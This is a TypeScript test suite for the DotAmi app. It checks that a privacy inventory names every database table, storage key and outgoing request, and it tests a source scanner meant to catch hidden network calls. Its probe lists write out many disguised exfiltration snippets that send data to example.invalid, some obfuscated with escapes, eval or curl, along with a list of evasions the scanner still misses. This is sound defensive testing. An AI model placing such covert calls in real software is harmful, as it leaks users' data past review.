import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";

import {
  BUILD_TIME_ONLY,
  FOLDERS,
  LOCAL_REQUESTS,
  SENT_ELSEWHERE,
  STARTS_PROGRAMS,
  TABLES,
  WINDOW_STORAGE,
  type AllowedCall,
} from "@/lib/privacy/inventory";

import { JS_FILES, networkCalls, readSource, simplify, sourceFiles } from "./helpers/source-scan";

/**
 * The /your-data page is drawn from lib/privacy/inventory.ts, so the page is only as honest as
 * that list is complete. These tests read the schema and the source and fail the moment a table is
 * added, or a browser-storage key or an outgoing request written in the ordinary way (or one of the
 * common disguises) is added, that the inventory doesn't name.
 *
 * That is a safety net, not a proof. The network scan can't see code written to hide a request (the
 * "known gaps" test below pins what it misses, and the header of tests/helpers/source-scan.ts says
 * why and what the page's Content-Security-Policy still stops), and the browser-storage scan still
 * reads text, so a quote inside a regular expression can hide a key written after it. Code review
 * covers what these don't.
 */

const SCAN = ["app", "components", "lib"];
const files = sourceFiles(SCAN);

function schemaModels(): string[] {
  const schema = readFileSync(path.join(process.cwd(), "prisma", "schema.prisma"), "utf8");
  return [...schema.matchAll(/^model\s+(\w+)\s*\{/gm)].map((m) => m[1]);
}

describe("the privacy inventory lists every database table", () => {
  it("reads the schema (a guard against the scan silently finding nothing)", () => {
    expect(schemaModels()).toContain("Figure");
    expect(schemaModels().length).toBeGreaterThanOrEqual(6);
  });

  it("has an entry for every model in prisma/schema.prisma", () => {
    const listed = new Set(TABLES.map((t) => t.model));
    const missing = schemaModels().filter((m) => !listed.has(m));
    expect(missing, `add these to TABLES in lib/privacy/inventory.ts: ${missing.join(", ")}`).toEqual([]);
  });

  it("lists no table the schema doesn't have, and none twice", () => {
    const real = new Set(schemaModels());
    expect(TABLES.filter((t) => !real.has(t.model)).map((t) => t.model)).toEqual([]);
    expect(new Set(TABLES.map((t) => t.model)).size).toBe(TABLES.length);
  });

  it("says, for each one, what it holds and what takes a record out", () => {
    for (const t of TABLES) {
      expect(t.name.trim(), `${t.model} needs a name`).not.toBe("");
      expect(t.holds.trim(), `${t.model} needs to say what it holds`).not.toBe("");
      expect(t.removedBy.trim(), `${t.model} needs to say what removes it ("nothing" is an answer)`).not.toBe("");
    }
  });

  it("calls the button that removes a link by the label it really has", () => {
    const label = TABLES.find((t) => t.model === "VentureLink")!.removedBy.match(/“([^”]+)”/)?.[1];
    expect(label, "the VentureLink entry should quote the button's label in “curly quotes”").toBeDefined();
    expect(readSource("components/ventures/ventures-page.tsx")).toMatch(new RegExp(`>\\s*${label}\\s*</button>`));
  });

  it("says the placeholder account's address can be set, by the setting the code really reads", () => {
    expect(TABLES.find((t) => t.model === "User")!.holds).toContain("STUB_USER_EMAIL");
    expect(readSource("lib/person/statements.ts")).toContain("process.env.STUB_USER_EMAIL");
  });
});

describe("the privacy inventory lists every browser-storage key", () => {
  // The values of string constants, so `getItem(MY_KEY)` can be read as the key it stands for.
  const constants = new Map<string, string>();
  for (const f of files) {
    for (const m of simplify(readSource(f), true).matchAll(/\bconst\s+([A-Za-z_$][\w$]*)\s*=\s*(["'])([^"'\n]*)\2/g)) {
      constants.set(m[1], m[3]);
    }
  }

  const used = new Map<string, string[]>(); // "store:key" -> the files that use it
  const unreadable: string[] = [];
  const otherUses: string[] = [];
  const otherStores: string[] = [];

  for (const f of files) {
    const code = simplify(readSource(f), true);
    for (const m of code.matchAll(/\b(localStorage|sessionStorage)\s*\.\s*(getItem|setItem|removeItem)\s*\(\s*([^,)]*)/g)) {
      const arg = m[3].trim();
      const literal = arg.match(/^(["'`])([^"'`$]*)\1$/);
      const key = literal ? literal[2] : constants.get(arg);
      if (key === undefined) {
        unreadable.push(`${f}: ${m[1]}.${m[2]}(${arg})`);
        continue;
      }
      const id = `${m[1]}:${key}`;
      used.set(id, [...(used.get(id) ?? []), f]);
    }

    // Anything else done with the storage objects (clear(), key(), bracket access, handing the
    // object to another function) could touch keys this scan can't name, so it is refused outright.
    const plain = simplify(readSource(f), false);
    for (const m of plain.matchAll(/\b(localStorage|sessionStorage)\b/g)) {
      const after = plain.slice(m.index! + m[0].length);
      if (!/^\s*\.\s*(getItem|setItem|removeItem)\s*\(/.test(after)) otherUses.push(`${f}: ${m[0]}`);
    }
    // Other places a window can keep things.
    for (const m of plain.matchAll(/\b(indexedDB|cookieStore|openDatabase)\b|document\s*\.\s*cookie|\bcaches\s*\./g)) {
      otherStores.push(`${f}: ${m[0]}`);
    }
  }

  it("sees the keys DotAmi uses today (a guard against the scan silently finding nothing)", () => {
    expect([...used.keys()]).toEqual(
      expect.arrayContaining([
        "localStorage:dotami-employment-suggestions",
        "sessionStorage:dotami-journey-v3",
        "sessionStorage:dotami-person-unsaved",
      ]),
    );
  });

  it("has an entry for every key the code reads or writes", () => {
    const listed = new Set(WINDOW_STORAGE.map((w) => `${w.store}:${w.key}`));
    const missing = [...used.keys()].filter((k) => !listed.has(k));
    expect(missing, `add these to WINDOW_STORAGE in lib/privacy/inventory.ts: ${missing.join(", ")}`).toEqual([]);
  });

  it("lists no key the code never uses (a renamed key would leave a stale line)", () => {
    const stale = WINDOW_STORAGE.map((w) => `${w.store}:${w.key}`).filter((k) => !used.has(k));
    expect(stale).toEqual([]);
  });

  it("can name every key: each one is a string written out or a constant, never built at run time", () => {
    expect(unreadable, "use a string constant for the key so the inventory can list it").toEqual([]);
  });

  it("finds no use of the storage objects it can't account for", () => {
    expect(otherUses).toEqual([]);
  });

  it("finds no other kind of browser storage (cookies, IndexedDB, the cache)", () => {
    expect(otherStores, "add a kind of entry for it to lib/privacy/inventory.ts, and extend this scan").toEqual([]);
  });

  it("says what each holds and how long it lasts", () => {
    for (const w of WINDOW_STORAGE) {
      expect(w.name.trim()).not.toBe("");
      expect(w.holds.trim()).not.toBe("");
      expect(w.lasts.trim()).not.toBe("");
    }
  });
});

describe("the privacy inventory lists what the desktop app writes beside the data file", () => {
  it.each(FOLDERS)("$name is still written by $writtenBy.file", (folder) => {
    const text = readFileSync(path.join(process.cwd(), folder.writtenBy.file), "utf8");
    expect(text, `${folder.writtenBy.file} no longer mentions ${folder.writtenBy.mentions}; was it renamed?`).toContain(
      folder.writtenBy.mentions,
    );
  });
});

// Every file that can reach the network: the app's own code, the desktop app's (it runs the update
// check and starts the server), and the two root files that configure the server.
const NETWORK_FILES = [...files, ...sourceFiles(["desktop"], JS_FILES), "middleware.ts", "next.config.mjs"];
const networkSources = NETWORK_FILES.map((file) => ({ file, code: readSource(file) }));

// The calls the inventory explains: each entry's own, the ones that stay on this computer, the
// programs the app starts, and the build scripts (which never ship).
const ALLOWED: readonly AllowedCall[] = [
  ...SENT_ELSEWHERE.flatMap((s) => s.calls),
  ...LOCAL_REQUESTS,
  ...STARTS_PROGRAMS,
  ...BUILD_TIME_ONLY,
];
// Helper functions that wrap fetch: a call of one is judged like a fetch.
const WRAPPERS = ALLOWED.flatMap((c) => (c.wrapper ? [c.wrapper] : []));

/** `list` without one copy of each of `remove`'s items (the same call can be listed, or made, twice). */
function without(list: string[], remove: string[]): string[] {
  const rest = [...remove];
  return list.filter((item) => {
    const at = rest.indexOf(item);
    if (at === -1) return true;
    rest.splice(at, 1);
    return false;
  });
}

/**
 * Every way the given files can reach the network other than a literal "/…" path on DotAmi's own
 * server, as "file: call": `unlisted` are the ones the allow-list doesn't name (a failure),
 * `stale` are allow-list entries that match nothing (also a failure: the list outlived the code).
 */
function requestsOutside(sources: { file: string; code: string }[], allowed: readonly AllowedCall[]) {
  const found = sources.flatMap(({ file, code }) =>
    networkCalls(code, WRAPPERS, file)
      .filter((c) => !c.relative)
      .map((c) => `${file}: ${c.call}`),
  );
  const listed = allowed.map((a) => `${a.file}: ${a.call}`);
  return { unlisted: without(found, listed), stale: without(listed, found) };
}

describe("the privacy inventory lists what can leave this computer", () => {
  // Where the app's own code talks to anything outside this computer. Each place must be one the
  // inventory describes, so a new request out can't be added without the page saying so.
  const sdkUsers = files.filter((f) => /from\s+["']@anthropic-ai\/sdk["']/.test(simplify(readSource(f), true)));
  const found = requestsOutside(networkSources, ALLOWED);

  it("knows the only code that reaches Anthropic: the intake's sentence reader", () => {
    expect(sdkUsers).toEqual(["app/api/intent/parse/route.ts"]);
    expect(SENT_ELSEWHERE.map((s) => s.id)).toContain("intake-sentence");
  });

  it("sees the requests the app makes today (a guard against the scan silently finding nothing)", () => {
    const calls = networkSources.flatMap(({ file, code }) => networkCalls(code, WRAPPERS, file).map((c) => ({ file, ...c })));
    expect(calls.filter((c) => c.relative).length).toBeGreaterThanOrEqual(15);
    expect(calls.filter((c) => !c.relative).map((c) => `${c.file}: ${c.call}`)).toEqual(
      expect.arrayContaining(ALLOWED.map((a) => `${a.file}: ${a.call}`)),
    );
    expect(networkSources.map((s) => s.file)).toEqual(expect.arrayContaining(["desktop/main.mjs", "middleware.ts"]));
  });

  it("finds no request leaving this computer that the inventory doesn't list", () => {
    expect(
      found.unlisted,
      "describe it on an entry of SENT_ELSEWHERE (or in LOCAL_REQUESTS if it stays on this computer, STARTS_PROGRAMS if it starts another program, BUILD_TIME_ONLY if only a build script does it) in lib/privacy/inventory.ts",
    ).toEqual([]);
  });

  it("lists no request the code no longer makes", () => {
    expect(found.stale, "remove it from lib/privacy/inventory.ts").toEqual([]);
  });

  it("says why each listed call is allowed", () => {
    for (const a of ALLOWED) expect(a.why.trim(), `${a.file}: ${a.call}`).not.toBe("");
  });

  it("keeps the build-time entries out of the installed app: desktop/package.mjs doesn't copy those files", () => {
    // The installer's staging list: `for (const f of ["main.mjs", …])` in desktop/package.mjs.
    const staged = readSource("desktop/package.mjs").match(/for \(const f of \[([^\]]*)\]/)?.[1];
    expect(staged, "desktop/package.mjs no longer lists the files it stages in the form this test reads").toContain('"main.mjs"');
    expect(BUILD_TIME_ONLY.length).toBeGreaterThan(0);
    for (const entry of BUILD_TIME_ONLY) {
      expect(entry.file.startsWith("desktop/"), `${entry.file} should be a desktop build script`).toBe(true);
      expect(staged, `${entry.file} is listed as build-time only but desktop/package.mjs copies it into the app`).not.toContain(
        `"${path.basename(entry.file)}"`,
      );
    }
  });

  it("lists the program the app starts, and only where the app's own server runs it", () => {
    expect(STARTS_PROGRAMS.map((s) => s.file)).toEqual(["app/api/law/provision/route.ts"]);
    expect(readSource("app/api/law/provision/route.ts")).toMatch(/spawn\(\s*"python"/);
  });

  it("still has the update check it describes (the installed app asks GitHub at start)", () => {
    const main = readFileSync(path.join(process.cwd(), "desktop", "main.mjs"), "utf8");
    expect(main).toContain("electron-updater");
    expect(SENT_ELSEWHERE.map((s) => s.id)).toContain("update-check");
  });

  it("says what is sent, when, and whether it can be taken back", () => {
    for (const s of SENT_ELSEWHERE) {
      expect(s.name.trim()).not.toBe("");
      expect(s.when.trim()).not.toBe("");
      expect(s.what.trim()).not.toBe("");
      expect(s.canTakeBack.trim()).not.toBe("");
    }
  });
});

// A safety net, not a proof (see the header of tests/helpers/source-scan.ts): these tests show what
// the scan refuses and, in "known gaps", what it plainly does not see.
describe("the scan for requests leaving this computer reads the syntax tree and refuses the common disguises", () => {
  const PROBE_FILE = "components/probe.tsx";
  const BACKSLASH = String.fromCharCode(92);
  const outside = (code: string, file = PROBE_FILE) => requestsOutside([{ file, code }], ALLOWED).unlisted;

  // Each is code that sends something somewhere the scan can't see to be a literal path on DotAmi's
  // own server, and what the scan must call it. String.raw keeps the backslash in the fourth.
  const PROBES: [string, string, string][] = [
    [
      "an address held in a constant (a telemetry call)",
      `const TELEMETRY = "https://example.invalid/collect";\nexport async function report(data: unknown) {\n  await fetch(TELEMETRY, { method: "POST", body: JSON.stringify(data) });\n}`,
      "fetch(TELEMETRY",
    ],
    ["an absolute URL", `await fetch("https://example.invalid/x");`, 'fetch("https://example.invalid/x"'],
    ["a protocol-relative address (another host)", `await fetch("//example.invalid/x");`, 'fetch("//example.invalid/x"'],
    ["a slash-backslash address (another host)", String.raw`await fetch("/\example.invalid/x");`, String.raw`fetch("/\example.invalid/x"`],
    ["a template that could put a host after the slash", "await fetch(`/${where}`);", "fetch(`/${where}`"],
    // An address is a path on DotAmi's own server only when the whole first argument is one literal.
    // A slash that is then joined to more text can still be the "//" that starts a host.
    [
      "a protocol-relative address built from two literals",
      `await fetch("/" + "/example.invalid/collect");`,
      `fetch("/" + "/example.invalid/collect"`,
    ],
    ["a slash joined to a constant", `await fetch("/" + HOST_PATH);`, `fetch("/" + HOST_PATH`],
    ["a literal path with something added on", `await fetch("/api/ventures/" + id);`, `fetch("/api/ventures/" + id`],
    ["a template that starts with a constant", "await fetch(`${BASE}/api/ventures`);", "fetch(`${BASE}/api/ventures`"],
    ["a lone slash", `await fetch("/");`, `fetch("/"`],
    // Browsers drop a tab or a line break inside a URL, so "/<tab>/host" is read as "//host".
    // (The tab is written as \t here and becomes a real one in the probe; the scan names it with a space.)
    ["a slash, a tab and a slash (another host once the tab is dropped)", `await fetch("/\t/example.invalid/x");`, `fetch("/ /example.invalid/x"`],
    [
      "XMLHttpRequest.open",
      `const request = new XMLHttpRequest();\nrequest.open("POST", TELEMETRY);`,
      "XMLHttpRequest.open(TELEMETRY",
    ],
    ["navigator.sendBeacon", `navigator.sendBeacon(TELEMETRY, payload);`, "sendBeacon(TELEMETRY"],
    ["a WebSocket", `const socket = new WebSocket(TELEMETRY);`, "new WebSocket(TELEMETRY"],
    ["an EventSource", `const feed = new EventSource(TELEMETRY);`, "new EventSource(TELEMETRY"],
    // The same constructors reached through the global object. The scan names them as the bare constructor.
    ["a WebSocket reached through globalThis", `const socket = new globalThis.WebSocket(TELEMETRY);`, "new WebSocket(TELEMETRY"],
    ["a WebSocket reached through window", `const socket = new window.WebSocket(TELEMETRY);`, "new WebSocket(TELEMETRY"],
    ["an EventSource reached through self", `const feed = new self.EventSource(TELEMETRY);`, "new EventSource(TELEMETRY"],
    ["an EventSource reached through a longer chain", `const feed = new window.parent.EventSource(TELEMETRY);`, "new EventSource(TELEMETRY"],
    ["a WebSocket reached through a cast global", `const socket = new (globalThis as any).WebSocket(TELEMETRY);`, "new WebSocket(TELEMETRY"],
    ["a WebSocket looked up by name", `const socket = new globalThis["WebSocket"](TELEMETRY);`, "new WebSocket(TELEMETRY"],
    ["an EventSource looked up by name", `const feed = new self['EventSource'](TELEMETRY);`, "new EventSource(TELEMETRY"],
    ["node's https.get", `import https from "node:https";\nhttps.get(TELEMETRY, () => {});`, "https.get(TELEMETRY"],
    ["importing node's https at all", `import { request } from "https";`, 'package "https"'],
    ["node's net.connect", `import net from "node:net";\nnet.connect(443, "example.invalid");`, "net.connect(443"],
    ["a library that makes requests", `import axios from "axios";`, 'package "axios"'],
    ["a library required rather than imported", `const got = require("got");`, 'package "got"'],
    ["a library loaded on demand", `const { default: ky } = await import("ky");`, 'package "ky"'],
    ["fetch handed on under another name", `const send = fetch;\nawait send(TELEMETRY);`, "fetch (used as a value)"],
    // Taking fetch off the global object is still handing it on. Only another object's own `fetch` is left alone.
    ["fetch taken off window", `const send = window.fetch;\nawait send(TELEMETRY);`, "fetch (used as a value)"],
    ["fetch taken off globalThis", `const send = globalThis.fetch;`, "fetch (used as a value)"],
    ["fetch taken off self", `const send = self.fetch;`, "fetch (used as a value)"],
    ["fetch taken off a cast global", `const send = (window as unknown as Deps).fetch;`, "fetch (used as a value)"],
    ["fetch taken off the global object by optional chaining", `const send = globalThis?.fetch;`, "fetch (used as a value)"],
    ["fetch pulled out of window by destructuring", `const { fetch: send } = window;`, "fetch (used as a value)"],
    ["fetch passed to something else as a property", `startClient({ fetch: send });`, "fetch (used as a value)"],
    ["fetch inside a comparison and a ternary (not JSX)", `const pick = (a: number, b: number) => [a > 1 ? fetch : null, b <a];`, "fetch (used as a value)"],
    // Blanking the page's words must leave the code around them in view.
    [
      "a call inside an element's attribute, beside text that mentions one",
      `export const Send = () => <button onClick={() => fetch(TELEMETRY)}>Send (we fetch(x) for you)</button>;`,
      "fetch(TELEMETRY",
    ],
    ["a call in an expression between the page's words", `export const Sent = () => <p>Sent {fetch(TELEMETRY)} and done</p>;`, "fetch(TELEMETRY"],
    ["fetch looked up by name", `await globalThis["fetch"](TELEMETRY);`, 'fetch (by name: ["fetch"])'],
    ["a call through the wrapper around fetch", `await postJson("https://example.invalid/x", {});`, 'postJson("https://example.invalid/x"'],
  ];

  it.each(PROBES)("refuses %s", (_what, code, call) => {
    expect(outside(code)).toContain(`${PROBE_FILE}: ${call}`);
  });

  // Disguises found by the two re-checks of this scan (the first five were the lib/zz-probe.ts
  // cases) and the ones the syntax-tree scan was built to close. Each sends something somewhere
  // the older text scan could not see, and the scan must now name it.
  const DISGUISES: [string, string, string][] = [
    // A quote or backtick inside a regular expression threw the text reader out of step, so a real call after it was read as part of a string.
    ["a call after a double quote inside a regular expression", `const quote = /"/g; await fetch(TELEMETRY);`, "fetch(TELEMETRY"],
    [
      "a call after a backtick inside a regular expression",
      "const tick = /`/g;\nawait fetch(TELEMETRY);\nconst after = `done`;",
      "fetch(TELEMETRY",
    ],
    // The backslash is made at run time (not typed in this file) so the escape reaches the scan as an escape.
    ["a name written with a unicode escape", `await ${BACKSLASH}u0066etch(TELEMETRY);`, "fetch(TELEMETRY"],
    // An address is judged on the text as written: a second slash written as an escape is still another host.
    [
      "a protocol-relative address whose second slash is an escape",
      String.raw`await fetch("/\x2fexample.invalid/x");`,
      String.raw`fetch("/\x2fexample.invalid/x"`,
    ],
    ["a name written with a braced unicode escape", `await fet${BACKSLASH}u{63}h(TELEMETRY);`, "fetch(TELEMETRY"],
    ["a method name written with a unicode escape", `navigator.send${BACKSLASH}u0042eacon(TELEMETRY, payload);`, "sendBeacon(TELEMETRY"],
    ["a constructor name written with a unicode escape", `const socket = new Web${BACKSLASH}u0053ocket(TELEMETRY);`, "new WebSocket(TELEMETRY"],
    [
      "a name built from two strings",
      `await globalThis["fe" + "tch"](TELEMETRY);`,
      `globalThis["fe" + "tch"] (key not a plain string)`,
    ],
    ["importing node's https through a template literal", "const https = await import(`node:https`);", 'package "node:https"'],
    // Module names, however they are quoted, reached or built.
    ["a module name joined from two strings", `const https = await import("node:" + "https");`, `import("node:" + "https" (package name not a plain string)`],
    ["a module name that is a variable", `const https = require(name);`, "require(name (package name not a plain string)"],
    ["a module name that is a template with a part in it", "const https = await import(`node:${NAME}`);", "import(`node:${NAME}` (package name not a plain string)"],
    ["requiring https by a template literal", "const https = require(`https`);", 'package "https"'],
    ["requiring https in single quotes", `const https = require('node:https');`, 'package "node:https"'],
    ["requiring https with an escape inside the name", String.raw`const https = require("ht\x74ps");`, 'package "https"'],
    [
      "requiring https through createRequire",
      `import { createRequire } from "node:module";\nconst https = createRequire(import.meta.url)("https");`,
      'package "https"',
    ],
    [
      "requiring https through a name that holds createRequire's result",
      `import { createRequire } from "node:module";\nconst load = createRequire(import.meta.url);\nconst https = load("https");`,
      'package "https"',
    ],
    ["getting https from the process", `const https = process.getBuiltinModule("node:https");`, 'package "node:https"'],
    [
      "requiring https through .call",
      `const https = require.call(null, "https");`,
      'require.call("https" (a module loaded through .call, .apply or .bind)',
    ],
    ["re-exporting from https", `export * from "https";`, 'package "https"'],
    ["importing a module from a web address", `const code = await import("https://example.invalid/x.js");`, 'package "https://example.invalid/x.js"'],
    ["undici, a library that makes requests", `import { request } from "undici";`, 'package "undici"'],
    // Other ways to send: another program, electron's own net.
    ["running curl with child_process", `import { execFile } from "node:child_process";\nexecFile("curl", [TELEMETRY]);`, 'package "node:child_process"'],
    ["child_process required without node:", `const { exec } = require("child_process");`, 'package "child_process"'],
    ["electron's net looked up by a string", `import electron from "electron";\nelectron["net"].request(TELEMETRY);`, 'package "electron" (net)'],
    ["electron's net looked up by a string, with no import in view", `electron["net"].request(TELEMETRY);`, 'package "electron" (net)'],
    ["electron's net taken off a namespace import", `import * as e from "electron";\ne.net.request(TELEMETRY);`, 'package "electron" (net)'],
    ["electron's net taken out of require", `const { net } = require("electron");`, 'package "electron" (net)'],
    ["electron's net renamed on import", `import { net as electronNet } from "electron";`, 'package "electron" (net)'],
    ["electron looked up by a variable", `import electron from "electron";\nconst api = electron[WHICH];`, "electron[WHICH] (key not a plain string)"],
    // A name looked up on the global object by something other than a plain string.
    ["a global looked up by a variable", `const k = "fetch";\nawait globalThis[k](TELEMETRY);`, "globalThis[k] (key not a plain string)"],
    ["a global taken out by a computed key", `const { [KEY]: send } = globalThis;`, "globalThis[KEY] (key not a plain string)"],
    ["Reflect.get on the global object", `await Reflect.get(globalThis, "fetch")(TELEMETRY);`, "Reflect.get(globalThis"],
    ["Reflect.get with a variable key on window", `const send = Reflect.get(window, KEY);`, "Reflect.get(window"],
    // The network's functions called some other way.
    ["fetch called through .call on a copy of the global object", `const g: any = globalThis;\nawait g.fetch.call(g, TELEMETRY);`, "fetch (used as a value)"],
    ["fetch called through .apply", `await window.fetch.apply(window, [TELEMETRY]);`, "fetch (used as a value)"],
    ["sendBeacon looked up by a string", `navigator["sendBeacon"](TELEMETRY, payload);`, 'sendBeacon (by name: ["sendBeacon"])'],
    ["sendBeacon bound to the navigator", `const beacon = navigator.sendBeacon.bind(navigator);`, "sendBeacon (used as a value)"],
    ["an optional call of fetch", `await fetch?.(TELEMETRY);`, "fetch(TELEMETRY"],
    ["fetch looked up by a string key in an object", `startClient({ "fetch": send });`, 'fetch (by name: ["fetch"])'],
    ["WebSocket held under another name", `const Socket = WebSocket;\nconst socket = new Socket(TELEMETRY);`, "WebSocket (used as a value)"],
    ["WebSocket built through Reflect.construct", `const socket = Reflect.construct(globalThis.WebSocket, [TELEMETRY]);`, "WebSocket (used as a value)"],
    ["a class that extends WebSocket", `class Tunnel extends WebSocket {}`, "WebSocket (used as a value)"],
    ["XMLHttpRequest held under another name", `const Request = XMLHttpRequest;`, "XMLHttpRequest (used as a value)"],
    ["an XMLHttpRequest's open called through .call", `const xhr = new XMLHttpRequest();\nxhr.open.call(xhr, "GET", TELEMETRY);`, "XMLHttpRequest.open.call(xhr"],
    ["another window looked up by a variable", `const found = window.parent[KEY];`, "window.parent[KEY] (key not a plain string)"],
  ];

  it.each(DISGUISES)("refuses %s", (_what, code, call) => {
    expect(outside(code)).toContain(`${PROBE_FILE}: ${call}`);
  });

  it("leaves an escaped name alone when it isn't one of the network's", () => {
    expect(outside(`const ${BACKSLASH}u0066oo = 1; export const bar = ${BACKSLASH}u0066oo;`)).toEqual([]);
  });

  it("refuses a file it can't parse rather than calling it clean", () => {
    expect(() => networkCalls("const = ;", [], "broken.ts")).toThrow(/doesn't parse/);
  });

  it("refuses the telemetry probe inside the real files too (the same scan the real check runs)", () => {
    const [, probe] = PROBES[0];
    const before = requestsOutside(networkSources, ALLOWED).unlisted;
    const after = requestsOutside([...networkSources, { file: PROBE_FILE, code: probe }], ALLOWED).unlisted;
    expect(after).toEqual([...before, `${PROBE_FILE}: fetch(TELEMETRY`]);
  });

  it("lets through a literal path on DotAmi's own server", () => {
    expect(outside(`await fetch("/api/ventures", { cache: "no-store" });`)).toEqual([]);
    expect(outside("await fetch(`/api/ventures/${id}/links?linkId=${encodeURIComponent(linkId)}`);")).toEqual([]);
    expect(outside(`const request = new XMLHttpRequest();\nrequest.open("GET", "/api/readout");`)).toEqual([]);
    expect(outside(`await postJson("/api/figures/agree", { ventureId });`)).toEqual([]);
    // Single quotes, a query string and a template with several parts are still one literal.
    expect(outside(`await fetch('/api/figures?venture=abc');`)).toEqual([]);
    expect(outside("await fetch(`/api/figures?venture=${encodeURIComponent(venture.id)}`, { cache: \"no-store\" });")).toEqual([]);
    // "/api/…" followed by a comma is the end of the first argument, not the start of more of it.
    expect(outside(`await fetch("/api/readout", { method: "POST" });`)).toEqual([]);
  });

  it("is not fooled by the words in a comment or a message", () => {
    expect(outside(`// await fetch(TELEMETRY);\nconst note = "could not fetch(data) from https://example.invalid";`)).toEqual([]);
    expect(outside(`/* new WebSocket(TELEMETRY) */ export const label = "sendBeacon(x)";`)).toEqual([]);
    expect(outside(`// new globalThis.WebSocket(TELEMETRY)\nexport const label = "new self.EventSource(x) and new window['WebSocket'](y)";`)).toEqual([]);
    // window.open is a link the person clicks, not a request DotAmi makes.
    expect(outside(`window.open("https://example.invalid/", "_blank");`)).toEqual([]);
  });

  // The word "fetch" in these is not the network function, so the scan has nothing to say about them.
  const NOT_THE_NETWORK: [string, string][] = [
    ["the word in text on the page", `export const Note = () => <p>We fetch nothing</p>;`],
    [
      "the word in text after an expression, with punctuation and an entity",
      "export function Note({ count }: { count: number }) {\n  return (\n    <p>\n      {count} fetch (or two) &amp; more; done\n    </p>\n  );\n}",
    ],
    ["the word in the text of an element with attributes", `export const Note = () => <a href="/x" onClick={() => go()}>fetch it later</a>;`],
    // Text that reads like a call is still text: the page's words are not code for any of the scan's rules.
    [
      "text on the page that reads like a call",
      "export const Note = () => (\n  <p>\n    We fetch(url) and new WebSocket(x), and don't sendBeacon(y) or call https.get(z).\n  </p>\n);",
    ],
    ["a property of another object", `const go = router.fetch;`],
    ["a property reached through a longer path", `const go = this.client.fetch;\nconst again = api?.fetch;\nconst third = routes[0].fetch;`],
  ];

  it.each(NOT_THE_NETWORK)("is not fooled by the word fetch as %s", (_what, code) => {
    expect(outside(code)).toEqual([]);
  });

  // Ordinary code that looks a little like a disguise but isn't one. The tree-reading rules must
  // stay quiet on each, or the allow-list fills up with noise.
  const ORDINARY: [string, string][] = [
    ["a quote inside a regular expression, with a harmless line after it", `const quote = /"/g;\nexport const has = (s: string) => quote.test(s);`],
    ["a backtick inside a regular expression", "const tick = /`/g;\nexport const count = (s: string) => s.split(tick).length;"],
    ["a plain-string lookup on the global object that isn't the network's", `window["scrollTo"](0, 0);\nconst root = globalThis["__dotami"];`],
    ["a lookup by a variable on something that isn't the global object", `const pick = (table: Record<string, string>, key: string) => table[key];\nconst value = process.env[NAME];`],
    ["a number as the key on a frame list", `const first = window.frames[0];`],
    ["a tree node called parent, indexed by a variable", `export const sibling = (parent: Record<string, string>, key: string) => parent[key];`],
    ["importing and requiring modules that aren't network ones", "const reader = await import(`@/lib/figures/file/read-file`);\nconst fs = require('node:fs');\nimport path from \"node:path\";"],
    ["importing something from electron that isn't its net", `import { app, BrowserWindow } from "electron";\nconst { ipcRenderer } = require("electron");`],
    ["Reflect.get on something that isn't the global object", `const label = Reflect.get(config, "label");`],
    ["a type that names fetch or WebSocket (nothing runs)", `type Fetcher = typeof fetch;\nlet socket: WebSocket | null = null;\ninterface Deps { fetch: Fetcher }`],
    ["a class with a fetch method of its own", `class Cache { fetch(key: string) { return key; } }`],
    ["words in a comment or a string that read like a disguise", `// globalThis[k](url); require(name); import("node:" + "https")\nconst note = "require(name) and Reflect.get(globalThis, k)";`],
    ["router.fetch.name (another object's own fetch, not called)", `const label = router.fetch.name;`],
  ];

  it.each(ORDINARY)("stays quiet on %s", (_what, code) => {
    expect(outside(code)).toEqual([]);
  });

  // What the scan does NOT see, named plainly in the header of tests/helpers/source-scan.ts and in
  // lib/privacy/inventory.ts. Each of these sends something somewhere. This test pins that the scan
  // really does miss them, so those two comments can't claim more than is true: if one starts being
  // caught, move it from "still gets past" to "refused" in those comments, then delete it here.
  // (A request made this way is for code review; in a browser the page's Content-Security-Policy
  // also stops most of them.)
  const EVAL = "ev" + "al";
  const FUNCTION_CONSTRUCTOR = "Func" + "tion";
  const STILL_GETS_PAST: [string, string][] = [
    ["a copy of window under another name, then its fetch", `const w = window;\nconst send = w.fetch;\nawait send(TELEMETRY);`],
    ["fetch taken off document.defaultView", `const send = document.defaultView.fetch;\nawait send(TELEMETRY);`],
    ["an image whose address carries the data", `new Image().src = "https://example.invalid/p?d=" + data;`],
    ["a script tag with an address", `export const Tag = () => <script src="https://example.invalid/x.js" />;`],
    ["window.open with the data in the address", `window.open("https://example.invalid/?d=" + data);`],
    ["moving the page to an address", `location.href = "https://example.invalid/?d=" + data;`],
    ["moving the page with location.assign", `location.assign("https://example.invalid/?d=" + data);`],
    ["a worker script from an address", `const worker = new Worker("https://example.invalid/w.js");\nimportScripts("https://example.invalid/x.js");`],
    ["a node internal binding", `process.binding("tcp_wrap");`],
    ["code built at run time", `${EVAL}("fetch(TELEMETRY)");`],
    ["code made by the Function constructor", `await ${FUNCTION_CONSTRUCTOR}("return fetch")()(TELEMETRY);`],
    ["a property descriptor taken off the global object", `const d = Object.getOwnPropertyDescriptor(window, KEY);\nawait d?.value(TELEMETRY);`],
    ["a wrapper the allow-list names, handed on and called under another name", `const send = postJson;\nawait send("https://example.invalid/x", {});`],
  ];

  it.each(STILL_GETS_PAST)(
    "does not see %s (a known gap, written down in the helper's header)",
    (_what, code) => {
      expect(outside(code), "the scan now sees this: update the 'still gets past' lists in tests/helpers/source-scan.ts and lib/privacy/inventory.ts, then remove it from here").toEqual([]);
    },
  );

  it("allows a listed call only in the file it is listed for, and only as often as it is listed", () => {
    const listed = LOCAL_REQUESTS.find((c) => c.call === "fetch(url")!;
    expect(outside("await fetch(url, init);", listed.file)).toEqual([]);
    expect(outside("await fetch(url, init);")).toEqual([`${PROBE_FILE}: fetch(url`]);
    expect(outside("await fetch(url, init);\nawait fetch(url, other);", listed.file)).toEqual([`${listed.file}: fetch(url`]);
  });
});
